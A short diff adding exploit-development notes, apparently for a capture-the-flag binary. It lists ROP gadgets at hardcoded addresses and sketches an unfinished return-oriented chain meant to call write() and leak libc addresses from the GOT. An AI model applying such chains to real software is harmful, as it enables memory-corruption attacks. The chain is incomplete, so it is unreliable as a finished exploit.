@@ -1,0 +1,37 @@
+Useful gadgets:
+
+0x0000000000404761: lea rax, qword ptr [rax + rdx*4]; ret;
+0x0000000000478e13: mov rax, qword ptr [rax + 8]; ret;
+0x00000000004b2303: pop rax; or byte ptr [rax - 0x77], cl; ret;
+0x00000000004b9341: inc ecx; ret;
+0x00000000004a56b7: shr al, cl; ret;
+0x0000000000406afb: pop rsi; ret;
+0x000000000044ad93: push rax; ret;
+
+close got: 0x756108
+
+goal: write(1, libc, bignum)
+
+rdi = 1
+rsi = [gots]
+bignum = bignum
+
+prime near close got: 0x756103
+
+ropchain = [
+	0x00000000004b2303: pop rax; or byte ptr [rax - 0x77], cl; ret;
+	0x756103,
+	0x00000000004a56b7: shr al, cl; ret;
+	0x0000000000478e13: mov rax, qword ptr [rax + 8]; ret;
+	0x000000000044ad93: push rax; ret;
+	0x0000000000406afb: pop rsi; ret;
+
+	call 0x401826
+
+
+0x000000000043b811: jmp rax;
+
+0x00000000004faa77: pop rcx; jne 0xfaad8; ret;
+0x0000000000401ff3: mov qword ptr [rcx], rdx; add rsp, 8; pop rbx; pop rbp; ret;
+0x000000000046e1bd: movsxd rdx, eax; call rbx;
+0x00000000004a1a1f: add al, 0x39; ret;
